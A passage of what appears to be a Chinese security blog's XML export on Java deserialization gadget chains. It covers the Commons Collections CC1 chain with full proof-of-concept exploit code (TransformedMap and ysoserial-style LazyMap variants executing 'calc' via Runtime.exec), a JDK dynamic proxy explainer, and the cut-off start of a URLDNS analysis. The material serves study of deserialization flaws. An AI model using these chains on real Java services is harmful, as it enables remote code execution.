NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<span class="comment">// 类原型</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class,Map.class); <span class="comment">// 获取构造器</span></span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置可访问非共有构造函数</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class, decorate);</span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时AnnotationInvocationHandler的成员变量memberValues为已经构造好的Map集合。</p><p>最终POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonsCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; TransformerMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<span class="comment">// 类原型</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class,Map.class); <span class="comment">// 获取构造器</span></span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置可访问非共有构造函数</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, TransformerMap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC1小结"><a href="#CC1小结" class="headerlink" title="CC1小结"></a>CC1小结</h1><p>漏洞根本在于InvokerTransformer的transform方法。就是一个包裹的反射任意方法调用。方法名、参数类型、参数都可在其构造函数初始化，在transform方法传入任意类原型。InvokerTransformer的transform可通过TransformerMap的checkSetValue进行包裹，因为该方法可通过实例化TransformerMap控制valueTransformer值来调用任意Transformer的transform方法，而checkSetValue方法在其方法TransformerMap的父类AbstractInputCheckedMapDecorator重写的setValue方法调用，并在其调用了checkSetValue方法，且调用对象为TransformerMap的一个键值对。然后setValue在AnnotationInvocationHandler的readObject方法中进行了调用。可通过序列化AnnotationInvocationHandler来进行调用InvokerTransformer的transform方法。</p><h1 id="ysoserialize的CC1"><a href="#ysoserialize的CC1" class="headerlink" title="ysoserialize的CC1"></a>ysoserialize的CC1</h1><p>ysoserialize的CC1的链和上边的不太一样。网上说上面的是传到国内时的分析。那我们就看一下ysoserialize的CC1的链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>​从给的利用链可看出，ysoserialze的ChainedTransformer.transform()后面是一样的。区别就在于ysoserialze用了LazyMap而没用TransformedMap。</p><p>根据给的Gadget chain，可知是AnnotationInvocationHandler.invoke()调用了get方法。在下面代码的第22行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​memberValues.get(member)，memberValues可控，member是Method类型通过invoke方法传入的参数调用getName()方法，可控。</p><p>那如何调用invoke方法呢？答案是对象代理。</p><p>AnnotationInvocationHandler实际上是一个调用处理器类，通过使用该类作为代理，就会自动调用AnnotationInvocationHandler的invoke函数。</p><p>分析invoke方法，member是我们调用方法的方法名，paramTypes为参数名，方法名不能是equals且带有一个参数、toString、hashCode、annotationType，且参数长度为0。即无参方法。那我们这里就可以使用Map的无参方法clear()。</p><p>发现正好AnnotationInvocationHandler的readObject方法中调用了entrySet方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,map);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">    map1.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201947955.png" alt="img"></p><p>那这就是一条完整的反序列化利用链，这是ysoserial的。</p><p>最终POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">    Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,map);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">    serialize(constructor.newInstance(Override.class,mapProxy));</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化CC1前奏JDK动态代理</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E5%89%8D%E5%A5%8FJDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E5%89%8D%E5%A5%8FJDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是动态代理"><a href="#什么是动态代理" class="headerlink" title="什么是动态代理"></a>什么是动态代理</h1><p>代理模式 (Proxy Pattern) 也称委托模式 (Deletage Pattern)，属于结构型设计模式，也是一项基本的设计技巧。通常，代理模式用于处理两种问题： </p><ul><li><strong>1、控制对基础对象的访问</strong></li><li><strong>2、在访问基础对象时增加额外功能</strong></li></ul><p> </p><p>它可以无感的对既有代码进行方法的增强，使得代码拥有更好的拓展性。  </p><p>用法也很简单：</p><p>当一个类实现了InvocationHandler接口，重写的invoke方法，在新建动态代理类的调用方法的时候会被自动调用（java底层原理实现的）。举一个例子：</p><p>下面是一个InvocationHandler的实现类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy.proxyTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExampleInvocationHandler</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hook method: &quot;</span> + method.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对Map对象进行动态代理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> proxy.proxyTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExampleInvocationHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, handler);</span><br><span class="line">        map.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;bb&quot;</span>);</span><br><span class="line">        System.out.println(map.get(<span class="string">&quot;aa&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果可以发现：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%8F%8D%E5%B0%84/202303201931105.png" alt="img"></p><p>执行了ExampleInvocationHandler的invoke方法。</p><p><strong>因此动态代理类相当于可以给自己的类添加一个套，当你调用自己的类的任意方法的时候都会先调用代理类的invoke方法。</strong></p><h1 id="在反序列漏洞的应用"><a href="#在反序列漏洞的应用" class="headerlink" title="在反序列漏洞的应用"></a>在反序列漏洞的应用</h1><p>对象的动态代理从表象来看：对一个类进行代理过，可以在代理类的invoke方法中写上自己的逻辑，在该类调用方法的时候都会自动执行代理类的invoke方法。</p><p>那对反序列化漏洞有什么用？</p><p>当我们在找反序列化利用链的时候，如果A类的a方法为危险方法，B类的b方法中可通过传参来调用A类的任意方法，C类的readObject方法中无法调用b方法，但是C类是一个代理类（实现了InvocationHandler接口）且C类的invoke方法中可以调用B类的b方法。那么这个时候我们就可以通过代理类的特性在实例化C类的时候会自动调用invoke方法进而使整条链有效。</p>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化URLDNS</title>
      <link href="/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/"/>
      <url>/2023/03/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96URLDNS/</url>
      
        <content type="html"><![CDATA[<p>​URLDNS 是最简单的反序列化利用链，它并不能用于漏洞的利用，它可以仅作为一种漏洞的检测方式。</p><h1 id="分析利用链"><a href="#分析利用链" class="headerlink" title="分析利用链"></a>分析利用链</h1><p>为什么URLDNS是一条链？</p><p>1、URL和HashMap实现了Serializable接口。</p><p>2、HashMap的put方法对key进行了hash运算。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​调用了hashCode方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而URL对应的hashCode方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span 